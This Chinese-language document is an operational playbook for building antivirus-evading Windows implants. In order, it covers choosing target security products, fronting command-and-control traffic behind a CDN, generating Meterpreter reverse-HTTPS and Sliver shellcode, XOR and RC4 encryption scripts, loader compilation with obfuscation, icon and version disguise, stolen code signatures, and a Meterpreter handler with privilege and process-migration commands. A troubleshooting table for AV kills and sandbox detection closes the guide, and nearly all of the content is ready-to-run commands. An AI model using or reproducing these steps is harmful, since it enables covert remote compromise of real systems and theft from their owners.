# 10 - 免杀实战标准操作流程（SOP）

## 完整流程：Shellcode → Loader → 验证上线

### 阶段1：信息收集

```bash
# 1.1 确认目标环境
# - 操作系统版本（Win7/10/11, Server 2016/2019/2022）
# - 杀软类型（Defender/360/火绒/ESET/CrowdStrike/SentinelOne）
# - 网络出站规则（是否允许直连/HTTPS/DNS）

# 1.2 确认C2基础设施
# - HTTPS证书（Let's Encrypt）
# - CDN前置（Cloudflare/Azure CDN）
# - 域名分类（不要用新注册域名）

# 1.3 确认端口
# 常用端口：443(HTTPS), 53(DNS), 8080, 8443, 8000
# 或伪装：伪装成Teams/Skype/OneDrive流量
```

### 阶段2：Shellcode生成

```bash
# 方案A: msfvenom stageless (稳定首选)
msfvenom -p windows/x64/meterpreter_reverse_https \
  LHOST=your-domain.com LPORT=443 \
  --encrypt aes256 --encrypt-key 'Str0ngK3y!2025#' --encrypt-iv '0123456789abcdef' \
  -f raw -o payload.bin

# 方案B: Donut (加载EXE/DLL转shellcode)
donut -i agent.exe -a 2 -b 1 -e 1 -k 2 -f raw -o payload.bin

# 方案C: Sliver (更隐蔽的C2)
sliver > generate --http your-domain.com --os windows --arch amd64 --format shellcode --save payload.bin
```

### 阶段3：Shellcode加密处理

```bash
# XOR加密（Python脚本）
python3 << 'EOF'
import os
key = 0x5A
with open('payload.bin', 'rb') as f:
    data = f.read()
encrypted = bytes([b ^ key for b in data])
with open('payload_enc.bin', 'wb') as f:
    f.write(encrypted)
print(f"Size: {len(encrypted)} bytes")
EOF

# 或使用RC4
python3 << 'EOF'
from Crypto.Cipher import ARC4
key = b'YourRC4Key2025!'
cipher = ARC4.new(key)
with open('payload.bin', 'rb') as f:
    data = f.read()
encrypted = cipher.encrypt(data)
with open('payload_enc.bin', 'wb') as f:
    f.write(encrypted)
EOF
```

### 阶段4：嵌入Loader

```bash
# 将加密后的shellcode转成C数组
python3 << 'EOF'
with open('payload_enc.bin', 'rb') as f:
    data = f.read()
# 格式化为C数组
arr = ','.join(f'0x{b:02x}' for b in data)
print(f"unsigned char shellcode[] = {{{arr}}};")
print(f"SIZE_T shellcode_len = {len(data)};")
EOF

# 生成的文件内容复制到loader.c中的shellcode数组位置
```

### 阶段5：编译Loader

```bash
# Go Loader
CGO_ENABLED=0 GOOS=windows GOARCH=amd64 \
garble -tiny -literals -seed=random build \
  -ldflags="-s -w -H=windowsgui" \
  -o payload.exe main.go

# C Loader (MinGW)
x86_64-w64-mingw32-gcc -O2 -s -fno-ident -fno-stack-protector \
  -Wl,--gc-sections,--strip-all \
  -o payload.exe loader.c -lntdll

# .NET Loader
dotnet publish -c Release -r win-x64 \
  --self-contained true -p:PublishSingleFile=true \
  -p:DebugType=None -p:DebugSymbols=false \
  -o payload.exe loader.csproj
```

### 阶段6：PE后处理

```bash
# 6.1 修改资源信息（图标、版本信息）
ResourceHacker.exe -open payload.exe -save payload_icon.exe \
  -action addoverwrite -res icon.ico -mask ICONGROUP,MAINICON,

# 6.2 修改版本信息（伪装成已知软件）
# 创建一个version.rc文件，编译后替换
x86_64-w64-mingw32-windres version.rc -O coff -o version.o

# 6.3 签名窃取
python3 sigthief.py -i legitimate_signed.exe -t payload_icon.exe -o final.exe

# 6.4 验证
file final.exe
# 应显示: PE32+ executable (GUI) x86-64, for MS Windows
```

### 阶段7：本地测试

```bash
# 7.1 关闭本地Defender实时保护
# 7.2 在隔离网络执行
final.exe

# 7.3 检查：
# - C2是否收到连接
# - 进程是否存活
# - 是否被杀软检测

# 7.4 VT检查（可选，注意：上传VT会入库）
# 仅上传hash查询：VT API
sha256sum final.exe
```

### 阶段8：上线验证

```bash
# msfconsole 监听
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_https
set LHOST 0.0.0.0
set LPORT 443
set HandlerSSLCert /path/to/cert.pem
set ExitOnSession false
exploit -j

# 目标执行后验证：
meterpreter > sysinfo
meterpreter > getuid
meterpreter > ps
meterpreter > migrate <PID>
meterpreter > getprivs
```

---

## 常见问题排查

| 问题 | 可能原因 | 解决方案 |
|------|---------|---------|
| 无连接 | 网络不通/防火墙 | 检查出站规则，换端口（443/53/8080） |
| 连接后秒断 | 杀软kill | 检查是否被杀，换syscall loader |
| 连接但无响应 | Staged payloa[REDACTED — CORE] | 换stageless |
| 执行后无反应 | 沙箱检测触发 | 增加延时/环境检测 |
| VT查杀率高 | 特征入库 | 换加密方式+garble+模板 |
| 360主动防御报警 | 行为触发 | 使用回调执行+Patching |
